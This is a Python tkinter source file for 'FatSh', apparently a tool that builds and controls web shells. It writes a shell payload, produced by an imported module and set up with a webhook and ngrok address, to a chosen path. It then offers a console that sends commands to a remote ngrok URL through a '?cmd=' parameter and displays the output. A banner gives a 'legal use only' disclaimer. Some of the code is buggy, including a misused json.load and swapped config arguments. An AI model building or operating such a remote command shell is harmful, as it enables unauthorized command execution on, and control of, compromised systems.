import tkinter as tk
import os
import json
import requests
from tkinter import Scrollbar
import shell
# Global Değişkenler
current_dir = os.path.dirname(os.path.abspath(__file__))
osn = os.name
conflag = False

banner = """
    ███████╗ █████╗ ████████╗███████╗██╗  ██╗
    ██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║
    █████╗  ███████║   ██║   ███████╗███████║
    ██╔══╝  ██╔══██║   ██║   ╚════██║██╔══██║
    ██║     ██║  ██║   ██║   ███████║██║  ██║
    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

    !!! ATTENTION !!!
   It is intended for legal use only. I am not responsible for it.
"""

# Kullanıcı etkileşim fonksiyonları
def on_enter(e):
    e.widget['background'] = '#3a3a3a'

def on_leave(e):
    e.widget['background'] = '#222222'

def on_entry_enter(e):
    e.widget['background'] = '#444444'

def on_entry_leave(e):
    e.widget['background'] = '#000000'

def create_button(parent, text, command, row, col):
    return tk.Button(parent, text=text, font=("Arial", 14), bg="#222222", fg="lime",
                     activebackground="#3a3a3a", activeforeground="lime", relief="flat", bd=0,
                     padx=15, pady=10, command=command).grid(row=row, column=col, padx=10, sticky="ew")

def create_label(parent, text, row, col, sticky="w", pady=10, padx=50):
    return tk.Label(parent, text=text, font=("Arial", 14), fg="lime", bg="black").grid(
        row=row,
        column=col,
        pady=pady,
        padx=padx,
        sticky=sticky
    )

def chconfig():
    # Eski pack kullanan satırı kaldırıyoruz ve yerine yeni grid kullanan satırları ekliyoruz.
    # tk.Label(opt, text="Enter Ngrok Auth:", font=("Arial", 14), bg="black", fg="lime").pack(pady=(40, 10), padx=50, anchor="w")
    create_label(opt, "Enter Ngrok Auth:", row=0, col=0, pady=(40, 10))
    
    ng = tk.Entry(opt, font=("Consolas", 12), fg="lime", bg="black", insertbackground="lime", width=70)
    ng.grid(row=1, column=0, pady=(0, 20), padx=50) # Entry'yi de grid ile yerleştiriyoruz

    # Eski pack kullanan satırı kaldırıyoruz ve yerine yeni grid kullanan satırı ekliyoruz.
    # create_label(opt, "Enter webhook:")
    create_label(opt, "Enter webhook:", row=2, col=0)

    wb = tk.Entry(opt, font=("Consolas", 12), fg="lime", bg="black", insertbackground="lime", width=70)
    wb.grid(row=3, column=0, pady=(0, 20), padx=50) # Entry'yi de grid ile yerleştiriyoruz

    # Buton zaten grid kullanıyordu, bu yüzden fonksiyon adı değişse de mantık aynı kalıyor.
    create_button(opt, "change", lambda: chconfig2(ng.get(), wb.get()), row=4, col=0)

def chconfig2(webhook, ngrok):
    with open(f"{current_dir}/config.json", "r") as rcfg:
        cfg = json.loads(rcfg.read())
        cfg["webhook"] = webhook
        cfg["ngrok"] = ngrok

def conshell():
    global conflag
    for widget in opt.winfo_children():
        widget.destroy()

    create_label(opt, "Enter Ngrok Url:")

    url = tk.Entry(opt, font=("Consolas", 12), fg="lime", bg="black", insertbackground="lime", width=40)
    url.pack(pady=(0, 20), padx=50)

    def conshell2():
        global conflag
        ngrok_url = url.get()
        if not ngrok_url:
            return

        for widget in opt.winfo_children():
            widget.destroy()
        conflag = True

        canvas = tk.Canvas(opt, bg="black", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        scrollbar = tk.Scrollbar(opt, orient="vertical", command=canvas.yview)
        canvas.configure(yscrollcommand=scrollbar.set)

        inner_frame = tk.Frame(canvas, bg="black")
        canvas.create_window((0, 0), window=inner_frame, anchor="nw")

        def on_frame_configure(event):
            canvas.configure(scrollregion=canvas.bbox("all"))

        inner_frame.bind("<Configure>", on_frame_configure)

        text = tk.Text(inner_frame, background="black", foreground="lime", insertbackground="lime",
                       font=("Consolas", 12), wrap="word", height=20)
        text.pack(fill="both", expand=True)
        text.insert(tk.END, "shell>>")
        text.focus_set()

        def send(event=None):
            user_input = text.get("end-2l linestart", "end-1c").replace("shell>>", "").strip()
            try:
                response = requests.get(f"{ngrok_url}/?cmd={user_input}")
                result = response.json().get("result", "")
            except Exception as e:
                result = f"[Error] {e}"

            text.insert(tk.END, f"\n{result}\n\nshell>>")
            text.see(tk.END)
            return "break" 

        def exit():
            global conflag
            for widget in opt.winfo_children():
                widget.destroy()
            conflag = False

        text.bind("<Return>", send)
        text.bind("<Escape>", exit)

    create_button(opt, "connect", conshell2, 2, 0)

def mkshell2(event=None):
    path2 = path.get()  # Kullanıcı tarafından girilen yol
    if not path2:
        return

    try:
        with open(f"{current_dir}/config.json", "r") as rcfg:
            cfg = json.load(rcfg.read())

        # Payload'ı yazma işlemi
        try:
            with open(path2, "w") as payload:
                payload.write(shell.getshell(cfg["webhook"], cfg["ngrok"]))

        except FileNotFoundError:
            if osn == "posix":  # Linux/macOS
                os.system(f"touch {path2}")  # Dosya oluşturulmazsa, oluşturmak için komut
            else:
                os.system(f"echo. > {path2}")  # Windows için dosya oluşturma komutu

        # Durum mesajını güncelle
        status_label.config(text=f"Payload created at:\n{path2}", fg="lime")
    except Exception as e:
        status_label.config(text=f"Error: {str(e)}", fg="red")

def mkshell():
    # Temizleme
    for widget in opt.winfo_children():
        widget.destroy()

    # Etiket
    lbl = tk.Label(opt, text="Enter Shell Path:", font=("Arial", 14), bg="black", fg="lime")
    lbl.pack(pady=(40, 10), padx=50, anchor="w")

    global path
    path = tk.Entry(opt, font=("Consolas", 12), fg="lime", bg="black", insertbackground="lime", width=40)
    path.pack(pady=(0, 20), padx=50)
    path.bind("<Enter>", on_entry_enter)
    path.bind("<Leave>", on_entry_leave)
    path.focus_set()

    # Durum etiketini ekleyelim
    global status_label
    status_label = tk.Label(opt, text="", font=("Arial", 12), bg="black", fg="lime")
    status_label.pack(pady=(0, 20), padx=50)

    # "Create Payload" butonunu ekleyelim
    btn_create = tk.Button(opt, text="Create Payload", font=("Arial", 14), bg="#222222", fg="lime",
                           activebackground="#3a3a3a", activeforeground="lime",
                           relief="flat", bd=0, padx=15, pady=10, command=mkshell2)
    btn_create.pack(pady=10)
    btn_create.bind("<Enter>", on_enter)
    btn_create.bind("<Leave>", on_leave)
def fgui():
    global opt
    gui.destroy()
    gui2 = tk.Tk()
    gui2.title("FatSh")
    gui2.geometry("600x400")
    gui2.configure(bg="black")

    options = tk.Frame(gui2, background="black")
    options.pack(side="top", fill="x", padx=20, pady=20)

    create_button(options, "make\nshell", mkshell, 0, 0)
    create_button(options, "connect\nshell", conshell, 0, 1)
    create_button(options, "more\noptions", None, 0, 2)
    create_button(options, "change\nconfig", chconfig, 0, 3)

    for i in range(4):
        options.grid_columnconfigure(i, weight=1)

    opt = tk.Frame(gui2, bg="black")
    opt.pack(fill="both", expand=True)

    gui2.mainloop()

def skip():
    skb = tk.Button(gui, text="I Understand", background="black", foreground="lime",
                    font=("Arial", 14), command=fgui, relief="flat", bd=2,
                    activebackground="#3a3a3a", activeforeground="lime")
    skb.pack(pady=15)

    skb.bind("<Enter>", on_enter)
    skb.bind("<Leave>", on_leave)

gui = tk.Tk()
gui.title("Welcome")
gui.geometry("600x400")
gui.configure(bg="black")

label = tk.Label(gui, text=banner, font=("Courier", 12), justify="center",
                 bg="black", fg="lime", padx=25, pady=25)
label.pack(expand=True)

gui.after(2000, skip)
gui.mainloop()
